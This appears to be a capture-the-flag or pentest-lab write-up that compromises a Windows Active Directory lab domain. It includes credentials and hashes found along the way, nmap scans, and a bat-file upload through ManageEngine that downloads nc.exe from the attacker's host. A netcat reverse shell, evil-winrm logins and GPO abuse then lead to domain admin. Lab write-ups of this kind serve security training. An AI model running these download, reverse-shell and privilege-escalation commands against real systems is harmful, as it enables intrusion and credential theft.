## Creds and obtained accounts

### Domain
\\\dc01.secura.yzx

- Administrator
- charlotte
	- Remote Management Use
	- Domain Users
- DefaultAccount
- Guest
- krbtgt
- michael
	- Domain Users

Groups:
- Cloneable Domain Controllers
- DnsUpdateProxy
- Domain Admins
- Domain Computers
- Domain Controllers
- Domain Guests
- Domain Users
- Enterprise Admins
- Enterprise Key Admins
- Enterprise Read-only Domain Controllers
- Group Policy Creator Owners
- Key Admins
- Protected Users
- Read-only Domain Controllers
- Schema Admins

Domain-joined machines:
operatingsystem              dnshostname       operatingsystemversion
---------------              -----------       ----------------------
Windows Server 2016 Standard dc01.secura.yzx   10.0 (14393)          
Windows 10 Pro               secure.secura.yzx 10.0 (19042)          
Windows 10 Pro               era.secura.yzx    10.0 (19042)       


### 192.168.247.95 (secure.secura.yzx)
ManageEngine admin account:
admin:admin

have access to: nt authority\system

- Administrator
	- NTLM hash: `a51493b0b06e5e35f855245e71af1d14`
		- PtH with this hash does not work on other machines
- DefaultAccount
- Guest
- WDAGUtilityAccount

PS transcript file in `C:\output.txt`


### 192.168.114.96 (era.secura.yzx)

default password for MySQL: `appmanager`

- `apache`
	- password: `New2Era4.!`

DB passwords (found from `C:\xampp\mysql\data\creds`):
- Administrator
	- Almost4There8.?pc&G
- charlotte
	- password: `Game2On4.!`

### 192.168.114.97 (dc01.secura.yzx)

shares:
```
Share name  Type  Used as  Comment              

-------------------------------------------------------------------------------
ADMIN$      Disk           Remote Admin         
C$          Disk           Default share        
IPC$        IPC            Remote IPC           
NETLOGON    Disk           Logon server share   
SYSVOL      Disk           Logon server share   
test        Disk                                
```



## nmap scans

```
└─$ sudo nmap -sS -vv -p- 192.168.247.97
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 125
88/tcp    open  kerberos-sec     syn-ack ttl 125
135/tcp   open  msrpc            syn-ack ttl 125
139/tcp   open  netbios-ssn      syn-ack ttl 125
389/tcp   open  ldap             syn-ack ttl 125
445/tcp   open  microsoft-ds     syn-ack ttl 125
464/tcp   open  kpasswd5         syn-ack ttl 125
593/tcp   open  http-rpc-epmap   syn-ack ttl 125
636/tcp   open  ldapssl          syn-ack ttl 125
3268/tcp  open  globalcatLDAP    syn-ack ttl 125
3269/tcp  open  globalcatLDAPssl syn-ack ttl 125
5985/tcp  open  wsman            syn-ack ttl 125
9389/tcp  open  adws             syn-ack ttl 125
49665/tcp open  unknown          syn-ack ttl 125
49666/tcp open  unknown          syn-ack ttl 125
49668/tcp open  unknown          syn-ack ttl 125
49677/tcp open  unknown          syn-ack ttl 125
49678/tcp open  unknown          syn-ack ttl 125
49681/tcp open  unknown          syn-ack ttl 125
49708/tcp open  unknown          syn-ack ttl 125
49793/tcp open  unknown          syn-ack ttl 125
```

```
└─$ sudo nmap -sS -vv -p- 192.168.247.95-96
Nmap scan report for 192.168.247.95
Host is up, received echo-reply ttl 125 (0.041s latency).
Scanned at 2024-12-26 01:49:14 EST for 47s
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE        REASON
135/tcp   open  msrpc          syn-ack ttl 125
139/tcp   open  netbios-ssn    syn-ack ttl 125
445/tcp   open  microsoft-ds   syn-ack ttl 125
5001/tcp  open  commplex-link  syn-ack ttl 125
5040/tcp  open  unknown        syn-ack ttl 125
5985/tcp  open  wsman          syn-ack ttl 125
7680/tcp  open  pando-pub      syn-ack ttl 125
8443/tcp  open  https-alt      syn-ack ttl 125
12000/tcp open  cce4x          syn-ack ttl 125
44444/tcp open  cognex-dataman syn-ack ttl 125
47001/tcp open  winrm          syn-ack ttl 125
49664/tcp open  unknown        syn-ack ttl 125
49665/tcp open  unknown        syn-ack ttl 125
49666/tcp open  unknown        syn-ack ttl 125
49667/tcp open  unknown        syn-ack ttl 125
49668/tcp open  unknown        syn-ack ttl 125
49669/tcp open  unknown        syn-ack ttl 125
49670/tcp open  unknown        syn-ack ttl 125
49671/tcp open  unknown        syn-ack ttl 125
49672/tcp open  unknown        syn-ack ttl 125
52921/tcp open  unknown        syn-ack ttl 125
52949/tcp open  unknown        syn-ack ttl 125
63486/tcp open  unknown        syn-ack ttl 125
63487/tcp open  unknown        syn-ack ttl 125

Nmap scan report for 192.168.247.96
Host is up, received echo-reply ttl 125 (0.040s latency).
Scanned at 2024-12-26 01:49:14 EST for 47s
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 125
139/tcp   open  netbios-ssn  syn-ack ttl 125
445/tcp   open  microsoft-ds syn-ack ttl 125
3306/tcp  open  mysql        syn-ack ttl 125
5040/tcp  open  unknown      syn-ack ttl 125
5985/tcp  open  wsman        syn-ack ttl 125
47001/tcp open  winrm        syn-ack ttl 125
49664/tcp open  unknown      syn-ack ttl 125
49665/tcp open  unknown      syn-ack ttl 125
49666/tcp open  unknown      syn-ack ttl 125
49667/tcp open  unknown      syn-ack ttl 125
49668/tcp open  unknown      syn-ack ttl 125
49669/tcp open  unknown      syn-ack ttl 125
49670/tcp open  unknown      syn-ack ttl 125
49671/tcp open  unknown      syn-ack ttl 125

```


## 192.168.247.95 https
![[Pasted image 20241226191655.png]]
Click "First Time User?" -> get creds

![[Pasted image 20241226191718.png]]

Login with creds

Under Admin > Uploads Files/Binaries
![[Pasted image 20241226192138.png]]
`<Product_Home> = C:\Program Files\ManageEngine\AppManager14`

Upload a bat file for downloading nc.exe to the target machine (the binary is hosted on Kali).
File content:
```
powershell -Command "Invoke-WebRequest http://192.168.45.242:8888/nc.exe -OutFile 'C:\Program Files\ManageEngine\AppManager14\working\nc.exe'"
```
![[Pasted image 20241226201545.png]]

RCE Execute the bat script on the "Execute Program" page
1. Create action
   ![[Pasted image 20241226201734.png]]
2. Save and execute action
   ![[Pasted image 20241226201822.png]]

Next, run `nc -nlvp 6666` on Kali, then repeat the above steps to upload and execute this bat file to obtain reverse shell:
```
@echo off
.\nc.exe -e cmd 192.168.45.242 6666
PAUSE
exit
```

![[Pasted image 20241226201924.png]]

A flag is in `C:\Users\Administrator\Desktop\proof.txt`


Use command `Get-ChildItem -Path "C:\Program Files\ManageEngine\AppManager14" -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue` to find potentially sensitive files
- `C:\Program Files\ManageEngine\AppManager14\working\mysql\my.ini`:
	- default password for MySQL is `appmanager`

Creds found in `C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings`:
```
<profileName scope="Local">SECURE\apache</profileName>
        <userName>apache</userName>
        <password>New2Era4.!</password>
        <domain>SECURE</domain>
```


## 192.168.114.96 mysql

Initial access: `evil-winrm -i 192.168.114.96 -u apache -p "New2Era4.\!"`

a flag in `C:\Users\apache\Desktop\local.txt`

Local Users:
- Administrator
- apache
	- `New2Era4.!`
- DefaultAccount
- Guest
- WDAGUtilityAccount

Interesting local groups:
- Administrators
	- Administrator
- Hyper-V Administrators
	- none
- IIS_IUSRS
	- NT AUTHORITY\IUSR
- Power Users
	- none
- Remote Desktop Users
	- none

Interesting installed:
- Notepad++ (64-bit x64)

Sensitive file:
```
*Evil-WinRM* PS C:\Users\apache.ERA\AppData> type "C:\xampp\passwords.txt"
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ]

3) Mercury (not in the USB & lite version):

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser
   Password: wampp

4) WEBDAV:

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf

   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so

   Please do not forget to refresh the WEBDAV authentification (users and passwords).
```

find sensitive creds in `C:\xampp\mysql\data\creds`:
```
*Evil-WinRM* PS C:\xampp\mysql\data\creds> dir


    Directory: C:\xampp\mysql\data\creds


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/20/2022   3:54 PM           1023 creds.frm
-a----         7/20/2022   6:44 PM          98304 creds.ibd
-a----         7/20/2022   3:54 PM             65 db.opt


*Evil-WinRM* PS C:\xampp\mysql\data\creds> type creds.frm
þ

VÿùR!  ùCˆEöDí…­PVŠ™E±
(2€@2ÿPRIMARYÿInnoDBNNPR
                        P24ÿnameÿpassÿ
*Evil-WinRM* PS C:\xampp\mysql\data\creds> type creds.ibd
Qw8[œ▒▒@!ÿÿÿÿÿÿÿÿžžÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ&&ÿÿÿÿÿÿÿÿªÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿQw8[œ¦ý&q˜˜▒ý&q˜˜·{Ôœ¦▒ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÖiÒÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÖiÒÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ·{Ôœ¦&G­[ÿÿÿÿÿÿÿÿ³E¿▒Ï€¦2▒ò▒2Cinfimum
                                                                                                                         supremum
        ÿñcharlotte€Game2On4.!
▒ÿÙadministrator€Almost4There8.?pc&G­[³
*Evil-WinRM* PS C:\xampp\mysql\data\creds> type db.opt
default-character-set=latin1
default-collation=latin1_swedish_ci
```

After obtaining domain admin, there is a flag in `C:\Users\Administrator\Desktop\proof.txt`

## 192.168.114.97 DC01

initial access:
`evil-winrm -i 192.168.114.97 -u charlotte -p "Game2On4.\!"`

A flag is in `C:\Users\charlotte\Desktop\local.txt`

![[Pasted image 20250104235257.png]]

`.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"`

`exit` then relogin again

a flag in `C:\Users\Administrator.DC01\Desktop\proof.txt`

make charlotte domain admin: `net group "Domain Admins" charlotte /ADD /DOMAIN`
